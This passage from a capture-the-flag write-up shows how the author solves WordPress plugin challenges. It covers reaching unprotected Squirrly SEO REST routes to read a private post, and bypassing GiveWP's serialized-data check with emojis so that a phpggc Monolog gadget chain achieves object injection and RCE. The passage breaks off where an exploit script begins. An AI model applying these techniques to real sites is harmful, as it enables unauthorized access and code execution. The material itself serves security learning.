+</span></span><span class=line><span class=cl>                <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;__return_true&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>register_rest_route</span><span class=p>(</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>namespace</span><span class=p>,</span> <span class=s1>&#39;/test/&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;methods&#39;</span>             <span class=o>=&gt;</span> <span class=nx>WP_REST_Server</span><span class=o>::</span><span class=na>EDITABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;callback&#39;</span>            <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;testConnection&#39;</span> <span class=p>),</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;__return_true&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// load deprecate API for compatibility
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>deprecateRest</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm>    * Deprecate since version 12.1.10
+</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>deprecateRest</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>register_rest_route</span><span class=p>(</span> <span class=s1>&#39;save&#39;</span><span class=p>,</span> <span class=s1>&#39;/squirrly/&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;methods&#39;</span>             <span class=o>=&gt;</span> <span class=nx>WP_REST_Server</span><span class=o>::</span><span class=na>EDITABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;callback&#39;</span>            <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;savePost&#39;</span> <span class=p>),</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;__return_true&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>register_rest_route</span><span class=p>(</span> <span class=s1>&#39;test&#39;</span><span class=p>,</span> <span class=s1>&#39;/squirrly/&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;methods&#39;</span>             <span class=o>=&gt;</span> <span class=nx>WP_REST_Server</span><span class=o>::</span><span class=na>EDITABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;callback&#39;</span>            <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;testConnection&#39;</span> <span class=p>),</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;__return_true&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>register_rest_route</span><span class=p>(</span> <span class=s1>&#39;get&#39;</span><span class=p>,</span> <span class=s1>&#39;/squirrly/&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;methods&#39;</span>             <span class=o>=&gt;</span> <span class=nx>WP_REST_Server</span><span class=o>::</span><span class=na>READABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;callback&#39;</span>            <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;getData&#39;</span> <span class=p>),</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;__return_true&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>as can be seen in the <code>hookInit</code> method, the rest api only registered once several value is available in the options.</p><p>if we checks on <code>/wp-json</code>, we can&rsquo;t see any of those rest api as well.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-39.png width=609 height=550 loading=lazy class=gallery-image data-flex-grow=110 data-flex-basis=265px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>defined</span><span class=p>(</span> <span class=s1>&#39;SQ_OPTION&#39;</span> <span class=p>)</span> <span class=o>||</span> <span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;SQ_OPTION&#39;</span><span class=p>,</span> <span class=s1>&#39;sq_options&#39;</span> <span class=p>);</span> <span class=c1># yoinked from config.php
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>getOptions</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nx>is_multisite</span><span class=p>()</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>self</span><span class=o>::</span><span class=nv>$options</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span> <span class=nx>get_blog_option</span><span class=p>(</span> <span class=nx>get_main_site_id</span><span class=p>(),</span> <span class=nx>SQ_OPTION</span> <span class=p>),</span> <span class=k>true</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>self</span><span class=o>::</span><span class=nv>$options</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span> <span class=nx>get_option</span><span class=p>(</span> <span class=nx>SQ_OPTION</span> <span class=p>),</span> <span class=k>true</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>self</span><span class=o>::</span><span class=nv>$options</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>getOption</span><span class=p>(</span><span class=nv>$key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=nv>$options</span><span class=p>[</span><span class=nv>$key</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>self</span><span class=o>::</span><span class=nv>$options</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>getOptions</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=nv>$options</span><span class=p>[</span><span class=nv>$key</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>self</span><span class=o>::</span><span class=nv>$options</span><span class=p>[</span><span class=nv>$key</span><span class=p>]</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>apply_filters</span><span class=p>(</span><span class=s1>&#39;sq_option_&#39;</span> <span class=o>.</span> <span class=nv>$key</span><span class=p>,</span> <span class=nx>self</span><span class=o>::</span><span class=nv>$options</span><span class=p>[</span><span class=nv>$key</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The function used to obtain <code>sq_options</code> value from database, then perform json decode. hmmm, json decode? sounds great!</p><p>Here&rsquo;s the beautified json config looks like
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-37.png width=506 height=203 loading=lazy class=gallery-image data-flex-grow=249 data-flex-basis=598px></p><p>So we need to set <code>sq_api</code> value to anything than empty string, <code>sq_cloud_connect</code> to true, and <code>sq_cloud_token</code> to our controlled string.</p><p>we can do this with following ajax action</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-38.png width=1545 height=504 loading=lazy class=gallery-image data-flex-grow=306 data-flex-basis=735px></p><p>now the rest api successfully registered!</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-40.png width=882 height=904 loading=lazy class=gallery-image data-flex-grow=97 data-flex-basis=234px></p><p>Now we can continue with the rest api callback. One of the interesting callback is <code>getData</code> where it can be used to retrieve post informations based on postId</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>getData</span><span class=p>(</span> <span class=nx>WP_REST_Request</span> <span class=nv>$request</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$wpdb</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$response</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nx>SQ_Classes_Helpers_Tools</span><span class=o>::</span><span class=na>setHeader</span><span class=p>(</span> <span class=s1>&#39;json&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>//get the token from API
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$token</span> <span class=o>=</span> <span class=nv>$request</span><span class=o>-&gt;</span><span class=na>get_param</span><span class=p>(</span> <span class=s1>&#39;token&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nv>$token</span> <span class=o>&lt;&gt;</span> <span class=s1>&#39;&#39;</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$token</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span> <span class=nv>$token</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>||</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>&lt;&gt;</span> <span class=nv>$token</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span> <span class=nx>wp_json_encode</span><span class=p>(</span> <span class=k>array</span><span class=p>(</span> <span class=s1>&#39;error&#39;</span> <span class=o>=&gt;</span> <span class=nx>esc_html__</span><span class=p>(</span> <span class=s2>&#34;Connection expired. Please try again.&#34;</span><span class=p>,</span> <span class=s1>&#39;squirrly-seo&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$select</span> <span class=o>=</span> <span class=nv>$request</span><span class=o>-&gt;</span><span class=na>get_param</span><span class=p>(</span> <span class=s1>&#39;select&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span> <span class=nv>$select</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=s1>&#39;innerlinks&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># SNIFFED
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=s1>&#39;keyword&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=c1># SNIFFED
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=s1>&#39;posts&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># SNIFFED
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=s1>&#39;post&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nv>$id</span> <span class=o>=</span> <span class=p>(</span><span class=nx>int</span><span class=p>)</span> <span class=nv>$request</span><span class=o>-&gt;</span><span class=na>get_param</span><span class=p>(</span> <span class=s1>&#39;id&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span> <span class=nv>$id</span> <span class=o>==</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>wp_send_json_error</span><span class=p>(</span> <span class=nx>esc_html__</span><span class=p>(</span> <span class=s2>&#34;Wrong Params&#34;</span><span class=p>,</span> <span class=s1>&#39;squirrly-seo&#39;</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1>//get Squirrly SEO post metas
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span> <span class=p>(</span> <span class=nv>$post</span> <span class=o>=</span> <span class=nx>SQ_Classes_ObjController</span><span class=o>::</span><span class=na>getClass</span><span class=p>(</span> <span class=s1>&#39;SQ_Models_Snippet&#39;</span> <span class=p>)</span><span class=o>-&gt;</span><span class=na>setPostByID</span><span class=p>(</span> <span class=nv>$id</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$response</span> <span class=o>=</span> <span class=nv>$post</span><span class=o>-&gt;</span><span class=na>toArray</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=s1>&#39;squirrly&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># SNIFFED
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>wp_json_encode</span><span class=p>(</span> <span class=nv>$response</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>however in order to access this route, we need to input <code>token</code> parameter which will be compared with token in the config. As we already set the token before, we can directly access this routes.</p><p>We need to perform little bruteforce here to find the correct postid where flag is stored. I found the private post in id 5.</p><p>Flag Obtained!</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-41.png width=1549 height=813 loading=lazy class=gallery-image data-flex-grow=190 data-flex-basis=457px></p><p><strong>Flag: CTF{up_to_you_how_to_get_the_flag_7cdd34392012dd}</strong></p><hr><h3 id=give>Give</h3><blockquote><p>Who give me ?</p><p>This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).</p></blockquote><p>In this challenge, two plugins were given. <code>give</code> and <code>rollbar</code></p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-42.png width=660 height=209 loading=lazy class=gallery-image data-flex-grow=315 data-flex-basis=757px></p><p>Patchstack recently published article about <a class=link href=https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/ target=_blank rel=noopener>GiveWP Unauthenticated Object Injection</a></p><p>In the current version of GiveWP, there were no POP Gadget that can be used to achieve RCE. However we have <code>rollbar</code> plugin which contains POP Gadget for Monolog. The same plugin also used in previous Patchstack CTF.</p><p>In the post, it was mentioned that previous fix for CVE-2024-5932 or validation in <code>isSerialized</code> method can be bypassed using emojies. The validation will return False due to emoji bypass, and the final value (before being inserted into the database) is sanitized using the sanitize_text_field function, which will remove the emojis from the user input. Thus, a serialized object is inserted into the database.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>give_clean</span><span class=p>(</span><span class=nv>$var</span><span class=p>,</span> <span class=nv>$allow_serialized_data</span> <span class=o>=</span> <span class=k>false</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$var</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>array_map</span><span class=p>(</span><span class=s1>&#39;give_clean&#39;</span><span class=p>,</span> <span class=nv>$var</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nx>Utils</span><span class=o>::</span><span class=na>isSerialized</span><span class=p>(</span><span class=nv>$var</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$var</span> <span class=o>=</span> <span class=nv>$allow_serialized_data</span> <span class=o>?</span> <span class=nx>Utils</span><span class=o>::</span><span class=na>safeUnserialize</span><span class=p>(</span><span class=nv>$var</span><span class=p>)</span> <span class=o>:</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>is_scalar</span><span class=p>(</span><span class=nv>$var</span><span class=p>)</span> <span class=o>?</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nx>wp_unslash</span><span class=p>(</span><span class=nv>$var</span><span class=p>))</span> <span class=o>:</span> <span class=nv>$var</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>When the value is retrieved from database (using <code>get_meta</code> function), it will try to unserialize the value. Thus giving us Object Injection Vulnerability, sweat 😋</p><p>In order to know where should we put the emoji bypass, we need to look at the validation code. As can be seen below, it try to detect several serialized pattern. This pattern can be bypassed by replacing (for example) <code>O:DIGIT</code> with <code>O:emojiDIGIT</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>isSerialized</span><span class=p>(</span><span class=nv>$data</span><span class=p>)</span><span class=o>:</span> <span class=nx>bool</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>removeBackslashes</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_serialized</span><span class=p>(</span><span class=nv>$data</span><span class=p>)</span> <span class=o>||</span> <span class=nx>self</span><span class=o>::</span><span class=na>containsSerializedDataRegex</span><span class=p>(</span><span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>containsSerializedDataRegex</span><span class=p>(</span><span class=nv>$data</span><span class=p>)</span><span class=o>:</span> <span class=nx>bool</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span> <span class=nx>is_string</span><span class=p>(</span><span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$pattern</span> <span class=o>=</span> <span class=s1>&#39;/
+</span></span></span><span class=line><span class=cl><span class=s1>    (a:\d+:\{.*\}) |         # Matches arrays (e.g: a:2:{i:0;s:5:&#34;hello&#34;;i:1;i:42;})
+</span></span></span><span class=line><span class=cl><span class=s1>    (O:\d+:&#34;[^&#34;]+&#34;:\{.*\}) | # Matches objects (e.g: O:8:&#34;stdClass&#34;:1:{s:4:&#34;name&#34;;s:5:&#34;James&#34;;})
+</span></span></span><span class=line><span class=cl><span class=s1>    (s:\d+:&#34;[^&#34;]*&#34;;) |       # Matches strings (e.g: s:5:&#34;hello&#34;;)
+</span></span></span><span class=line><span class=cl><span class=s1>    (i:\d+;) |               # Matches integers (e.g: i:42;)
+</span></span></span><span class=line><span class=cl><span class=s1>    (b:[01];) |              # Matches booleans (e.g: b:1; or b:0;)
+</span></span></span><span class=line><span class=cl><span class=s1>    (d:\d+(\.\d+)?;) |       # Matches floats (e.g: d:3.14;)
+</span></span></span><span class=line><span class=cl><span class=s1>    (N;)                     # Matches NULL (e.g: N;)
+</span></span></span><span class=line><span class=cl><span class=s1>    /x&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span> <span class=nv>$data</span><span class=p>)</span> <span class=o>===</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Ok, so now how can we insert the payload?🤔</p><p>Luckily, in the fresh installation of GiveWP plugins, there was a default Donation page.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-43.png width=2560 height=818 loading=lazy class=gallery-image data-flex-grow=312 data-flex-basis=751px></p><p>It can be accessed within <code>/?give_forms=givewp-donation-form</code>
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-44.png width=1187 height=987 loading=lazy class=gallery-image data-flex-grow=120 data-flex-basis=288px></p><p>By inserting all required data, we should able to get POST requests below.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-45.png width=1550 height=820 loading=lazy class=gallery-image data-flex-grow=189 data-flex-basis=453px></p><p>Nest step is to create serialized gadget. I&rsquo;ll use <a class=link href=https://github.com/ambionics/phpggc target=_blank rel=noopener>phpggc</a> to create the POP Gadget Chain payload.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-47.png width=1100 height=139 loading=lazy class=gallery-image data-flex-grow=791 data-flex-basis=1899px></p><p>In order to send the crafted exploit, i&rsquo;ll use python script below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
